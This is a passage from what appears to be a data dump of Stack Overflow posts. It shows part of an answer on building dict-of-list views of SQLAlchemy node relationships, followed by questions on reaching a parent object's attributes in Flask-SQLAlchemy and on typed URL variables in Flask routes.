    def left_nodes_edge_type(self):
        return {self.edge_type: self.left_node}

    @property
    def right_nodes_edge_type(self):
        return {self.edge_type: self.left_node}
</code></pre>

<p>This does of course not produce the desired dict of list, but a list of dict:</p>

<pre><code>&gt;&gt;&gt; node.right_nodes
[{'edge_type': &lt;Node object&gt;}, {'edge_type': &lt;Node object&gt;}]
</code></pre>

<p>You can also simply define properties on the <code>Node</code> class itself and not use <code>association_proxy</code> at all to proxy from <code>Node</code> to <code>Node</code>:</p>

<pre><code>class Node(Base):

    # &lt;snip&gt;

    @property
    def left_nodes(self):
        d = defaultdict(list)
        for edge in self.left_edges:
            d[edge.edge_type].append(edge.left_node)
        return d

    @property
    def right_nodes(self):
        d = defaultdict(list)
        for edge in self.right_edges:
            d[edge.edge_type].append(edge.right_node)
        return d
</code></pre>

<p>This allows the desired view as a dict of list:</p>

<pre><code>&gt;&gt;&gt; node.right_nodes
{'edge_type': [&lt;Node object&gt;, &lt;Node object&gt;]}
&gt;&gt;&gt; node.right_nodes['edge_type']
[&lt;Node object&gt;, &lt;Node object&gt;]
</code></pre>

<p>but this is just a convenience view.</p>
"
39822087,6912714.0,2016-10-02 21:53:06+00:00,2,flask Sqlalchemy One to Many getting parent attributes,"<p>Im trying to get the Pet owner or persons name</p>

<pre><code>class Person(db.Model):
        id = db.Column(db.Integer, primary_key=True)
        name = db.Column(db.String(20))
        pets = db.relationship('Pet', backref='owner', lazy='dynamic')


class Pet(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(20))
    owner_id = db.Column(db.Integer, db.ForeignKey('person.id'))
</code></pre>

<p>I want to query the pets and after i select a pet i want to get pet owner names</p>

<pre><code>pets = Pet.query.all()
for pet in pets:
    print pet.owner_id 
</code></pre>

<p>will give the owner id but i want to owner name</p>
"
39822188,3344239.0,2016-10-02 22:04:34+00:00,2,Flask URL variable type None?,"<p>I'm trying to pass a number through URL and retrieve it on another page. If I try to specify the variable type, i get a malformed URL error and it won't compile. If I don't specify the var type, it will run, but the variable becomes Type None. I can't cast it to an int either. How can I pass it as an Integer...? Thanks in advance.</p>

<p>This gives me a malformed URL error:</p>

<pre><code>@app.route('/iLike/&lt;int: num&gt;', methods=['GET','POST'])
def single2(num):
</code></pre>

<p>This runs but gives me a var of type none that I can't work with:</p>

<pre><code>@app.route('/iLike/&lt;num&gt;', methods=['GET','POST'])
def single2(num):
     try:
        location = session.get('location')
        transType = session.get('transType')
        data = session.get('data')

        **num = request.args.get('num')**
</code></pre>
"
